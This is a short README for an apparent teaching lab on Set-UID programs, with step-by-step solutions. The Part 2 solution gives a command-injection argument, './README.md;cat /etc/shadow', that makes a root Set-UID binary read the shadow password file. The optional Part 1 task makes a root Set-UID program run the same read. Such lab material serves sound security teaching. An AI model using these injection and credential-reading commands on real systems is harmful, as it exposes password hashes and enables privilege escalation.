# SetUIDLab

Powerpoint is accessable here: https://docs.google.com/presentation/d/1hOcF7G4ISqTirPIZHpGaK1XkCXQ9ZMCZWoF4cEokwk0/edit?usp=sharing


# Solutions to the tasks:
## Don't Look Unless you're really stuck!

## Part 1
Task 1: Compile PrintMyUID.c into the program PrintMyUID.
`
	$ gcc PrintMyUID.c -o PrintMyUID
`
Task 2: Run the PrintMyUID program.
`
	$ ./PrintMyUID
`
Task 3: Change PrintMyUID to a root Set-UID program.
`
sudo chown root PrintMyUID
sudo chmod 4755 PrintMyUID
`
Task 4: Run the PrintMyUID program again and observe the changes.
`
	$ ./PrintMyUID
`

Task 5 (Optional): Modify PrintMyUID.c to print the contents of the /etc/shadow file. Repeat steps 1-4.

`
Change system("whoami"); to system("cat /etc/shadow");
`



## Part 2

Task 1: Compile Exploitable.c and make it a Set-UID program with compile-exploitable.sh
`
./compile-exploitable.sh
`

Task 2: Make the Exploitable program execute arbitrary commands as root using only command line arguments.
`
./Exploitable "./README.md;cat /etc/shadow"
`



